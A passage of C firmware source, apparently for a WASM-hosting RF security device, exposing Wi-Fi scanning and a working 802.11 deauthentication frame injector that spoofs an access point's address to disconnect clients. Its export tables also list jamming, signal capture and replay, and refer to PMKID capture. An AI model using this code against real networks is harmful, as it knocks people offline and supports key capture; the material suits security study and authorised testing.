        ap->channel      = e->channel;
        ap->rssi         = e->rssi;
        ap->security     = ap_map_security(e->security);
        ap->_pad[0]      = 0;
        ap->_pad[1]      = 0;
        ap->last_seen_ms = k_uptime_get_32();

    } else if (event == NET_EVENT_WIFI_SCAN_DONE) {
        k_sem_give(&g_aps_sem);
    }
}

/*
 * wifi_scan_aps(buf, buf_len) → int
 *
 * Runs a passive 802.11 scan and fills buf with akira_wifi_ap_t records.
 * Blocks up to WIFI_APS_TIMEOUT_MS ms. Returns the number of APs found,
 * or a negative errno on failure.
 *
 * Type string: "(*~)i" — WAMR validates ptr+len against WASM linear memory
 * and converts the WASM offset to a native pointer before the call.
 */
int akira_native_wifi_scan_aps(wasm_exec_env_t exec_env,
                                void *buf, uint32_t buf_len)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);

    if (!buf || buf_len < WIFI_AP_ENTRY_SIZE) return -EINVAL;

    struct net_if *iface = net_if_get_wifi_sta();
    if (!iface) {
        LOG_ERR("wifi_scan_aps: no STA interface");
        return -ENODEV;
    }

    uint32_t max_aps = buf_len / WIFI_AP_ENTRY_SIZE;
    if (max_aps > WIFI_APS_MAX) max_aps = WIFI_APS_MAX;

    memset(g_aps_buf, 0, sizeof(g_aps_buf));
    g_aps_count = 0;
    k_sem_init(&g_aps_sem, 0, 1);

    if (!g_aps_cb_reg) {
        net_mgmt_init_event_callback(&g_aps_cb, wifi_aps_event_handler,
                                     NET_EVENT_WIFI_SCAN_RESULT |
                                     NET_EVENT_WIFI_SCAN_DONE);
        net_mgmt_add_event_callback(&g_aps_cb);
        g_aps_cb_reg = true;
    }

    LOG_INF("wifi_scan_aps: starting passive scan");
    int ret = net_mgmt(NET_REQUEST_WIFI_SCAN, iface, NULL, 0);
    if (ret) {
        LOG_ERR("wifi_scan_aps: scan request failed: %d", ret);
        return ret;
    }

    ret = k_sem_take(&g_aps_sem, K_MSEC(WIFI_APS_TIMEOUT_MS));
    if (ret) LOG_WRN("wifi_scan_aps: timeout, returning %d partial results",
                     g_aps_count);

    uint32_t n = (uint32_t)g_aps_count < max_aps
                 ? (uint32_t)g_aps_count : max_aps;
    memcpy(buf, g_aps_buf, n * WIFI_AP_ENTRY_SIZE);

    LOG_INF("wifi_scan_aps: done — %d APs", g_aps_count);
    return (int)n;
}

/* ── 802.11 deauthentication frame injector ─────────────────────────────── */

/*
 * 802.11 Management frame: Deauthentication (subtype 0xC).
 * 24-byte MAC header per IEEE 802.11-2020 §9.3.3.1 plus the 2-byte reason
 * code body: 26 bytes on the air.
 */
struct __attribute__((packed)) deauth_frame {
    uint8_t  fc[2];      /* 0xC0 0x00 — Management, Deauthentication            */
    uint8_t  dur[2];     /* 0x3A 0x01 — NAV duration (~314 µs)                  */
    uint8_t  da[6];      /* Destination: target client or FF:FF:FF:FF:FF:FF      */
    uint8_t  sa[6];      /* Source: spoofed as AP BSSID                          */
    uint8_t  bssid[6];   /* BSS ID: AP BSSID                                     */
    uint8_t  seq[2];     /* Sequence control (incremented per frame)             */
    uint8_t  reason[2];  /* Reason code LE: 7 = Class-3 frame from non-assoc STA */
};

BUILD_ASSERT(sizeof(struct deauth_frame) == 26, "deauth_frame must be 26 bytes");

#define DEAUTH_MAX_COUNT      9999
#define DEAUTH_MIN_INTERVAL_MS  10
#define DEAUTH_MAX_INTERVAL_MS 1000

/*
 * wifi_deauth(bssid, client_mac, channel, count, interval_ms) → int
 *
 * Injects `count` 802.11 deauthentication frames directed at `client_mac`
 * (or broadcast FF:FF:FF:FF:FF:FF) from `bssid` on `channel`.
 * `interval_ms` is the inter-frame gap (min 10 ms).
 *
 * Returns the number of frames sent, or negative errno on error.
 * Requires AKIRA_CAP_WIFI_INJECT.
 *
 * Type string: "(**iii)i"
 */
int akira_native_wifi_deauth(wasm_exec_env_t exec_env,
                              void *bssid_ptr, void *client_ptr,
                              int32_t channel, int32_t count, int32_t interval_ms)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_WIFI_INJECT, -EPERM);

    if (!bssid_ptr || !client_ptr)          return -EINVAL;
    if (channel < 1 || channel > 14)        return -EINVAL;
    if (count   < 1 || count > DEAUTH_MAX_COUNT) return -EINVAL;
    if (interval_ms < DEAUTH_MIN_INTERVAL_MS) interval_ms = DEAUTH_MIN_INTERVAL_MS;
    if (interval_ms > DEAUTH_MAX_INTERVAL_MS) interval_ms = DEAUTH_MAX_INTERVAL_MS;

    /* "(**iii)i": WAMR validated only one byte of each pointer — re-check the
     * full 6-byte MAC before reading it. */
    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);
    if (!inst ||
        !wasm_runtime_validate_native_addr(inst, bssid_ptr, 6) ||
        !wasm_runtime_validate_native_addr(inst, client_ptr, 6)) {
        return -EFAULT;
    }

    const uint8_t *bssid  = (const uint8_t *)bssid_ptr;
    const uint8_t *client = (const uint8_t *)client_ptr;

    /* Set the radio to the target channel before injection */
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);

    struct deauth_frame frame;
    frame.fc[0]     = 0xC0; frame.fc[1]     = 0x00;
    frame.dur[0]    = 0x3A; frame.dur[1]    = 0x01;
    frame.reason[0] = 0x07; frame.reason[1] = 0x00; /* Reason 7 */
    memcpy(frame.da,    client, 6);
    memcpy(frame.sa,    bssid,  6);
    memcpy(frame.bssid, bssid,  6);

    int sent = 0;
    for (int32_t i = 0; i < count; i++) {
        /* Honour a stop between frames: this native holds no system lock, so
         * breaking out early is safe and keeps a misbehaving app bounded. */
        if (akira_runtime_stop_requested(exec_env)) {
            break;
        }

        /* Increment sequence number — low 12 bits of seq[0:1], LE */
        uint16_t seq = (uint16_t)(i << 4);
        frame.seq[0] = (uint8_t)(seq & 0xFF);
        frame.seq[1] = (uint8_t)(seq >> 8);

        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), true);
        if (err == ESP_OK) sent++;

        /* Stop-aware gap: a stop wakes this and the next loop test bails. */
        if (i < count - 1 && akira_runtime_sleep(exec_env, K_MSEC(interval_ms))) {
            break;
        }
    }

    LOG_INF("wifi_deauth: channel=%d count=%d sent=%d", channel, count, sent);
    return sent;
}

#endif /* CONFIG_WIFI && CONFIG_AKIRA_RF_FRAMEWORK */

/* Release RF resources of a WASM app when it ends, however it ends. Runs after
 * the mesh (order 40), which hands any chip it owns back to the RF layer first. */
static void rf_release(int slot, const char *app_name)
{
    ARG_UNUSED(app_name);
    akira_rf_api_release(slot);
}

AKIRA_APP_RESOURCE_DEFINE(rf, 60, NULL, rf_release);

#else /* !CONFIG_AKIRA_WASM_RUNTIME */

void akira_rf_api_release(int slot)
{
    ARG_UNUSED(slot);
}

#endif /* CONFIG_AKIRA_WASM_RUNTIME */


/* ===== WASM exports =====
 * Registered with WAMR by the native API registry (akira_native_registry.h).
 * Import names and signatures are WASM ABI: see docs/api-stability-policy.md.
 * The 802.11 scan/deauth natives are registered by akira_rf_wifi_natives
 * below; PMKID capture and client sniffing by akira_wifi_api.c. */
#if defined(CONFIG_AKIRA_WASM_RUNTIME) && defined(CONFIG_AKIRA_WASM_API) && (defined(CONFIG_AKIRA_WASM_API) && defined(CONFIG_AKIRA_MODULE_RF) && defined(CONFIG_AKIRA_RADIO_MANAGER))
#include <akira_native_registry.h>

static const NativeSymbol akira_rf_natives[] = {
    {"rf_set_frequency",       (void *)akira_native_rf_set_frequency,       "(i)i",    NULL},
    {"rf_set_power",           (void *)akira_native_rf_set_power,           "(i)i",    NULL},
    {"rf_get_rssi",            (void *)akira_native_rf_get_rssi,            "()i",     NULL},
    {"rf_send",                (void *)akira_native_rf_send,                "(ii)i",   NULL},
    {"rf_select",              (void *)akira_native_rf_select,              "(i)i",    NULL},
    {"rf_recv_pop",            (void *)akira_native_rf_recv_pop,            "(iii)i",  NULL},
    {"rf_receive",             (void *)akira_native_rf_receive,             "(iii)i",  NULL},
    {"rf_set_modulation",      (void *)akira_native_rf_set_modulation,      "(i)i",    NULL},
    {"rf_set_spreading_factor",(void *)akira_native_rf_set_spreading_factor,"(i)i",    NULL},
    {"rf_set_bandwidth",       (void *)akira_native_rf_set_bandwidth,       "(i)i",    NULL},
    {"rf_set_coding_rate",     (void *)akira_native_rf_set_coding_rate,     "(i)i",    NULL},
    {"rf_set_bitrate",         (void *)akira_native_rf_set_bitrate,         "(i)i",    NULL},
    /* Continuous-wave TX (CW) — jamming / range testing (TX is Seal-gated) */
    {"rf_tx_cw_start",         (void *)akira_native_rf_tx_cw_start,         "()i",     NULL},
    {"rf_tx_cw_stop",          (void *)akira_native_rf_tx_cw_stop,          "()i",     NULL},
    {"rf_tx_cw_set_freq",      (void *)akira_native_rf_tx_cw_set_freq,      "(i)i",    NULL},
    {"rf_set_sync_word",       (void *)akira_native_rf_set_sync_word,       "(i)i",    NULL},
    /* Raw OOK/ASK signal capture and replay (CC1101 / CC1121 / LR2021) */
    {"rf_raw_capture",         (void *)akira_native_rf_raw_capture,         "(iiii)i", NULL},
    {"rf_raw_replay",          (void *)akira_native_rf_raw_replay,          "(iiii)i", NULL},
};

AKIRA_NATIVE_API_DEFINE(akira_rf_api, "env", akira_rf_natives);
#endif

/* ===== WASM exports — 802.11 scan / deauth =====
 * Kept in akira_rf_api.c on this release line; the newer PMKID/client-sniff
 * natives live in akira_wifi_api.c. */
#if defined(CONFIG_AKIRA_WASM_RUNTIME) && defined(CONFIG_AKIRA_WASM_API) && (defined(CONFIG_AKIRA_WASM_API) && defined(CONFIG_WIFI) && defined(CONFIG_AKIRA_RF_FRAMEWORK))
#include <akira_native_registry.h>

static const NativeSymbol akira_rf_wifi_natives[] = {
    /* Passive 802.11 spectrum scan — per-channel max RSSI */
    {"wifi_scan_rssi", (void *)akira_native_wifi_scan_rssi, "(ii)i",      NULL},
    /* Passive 802.11 AP scan — full SSID/BSSID/channel/RSSI/security records */
    {"wifi_scan_aps",  (void *)akira_native_wifi_scan_aps,  "(*~)i",      NULL},
    /* 802.11 deauth frame injector — requires wifi.inject capability */
    {"wifi_deauth",    (void *)akira_native_wifi_deauth,    "(**iii)i",   NULL},
};

AKIRA_NATIVE_API_DEFINE(akira_rf_wifi_api, "env", akira_rf_wifi_natives);
#endif
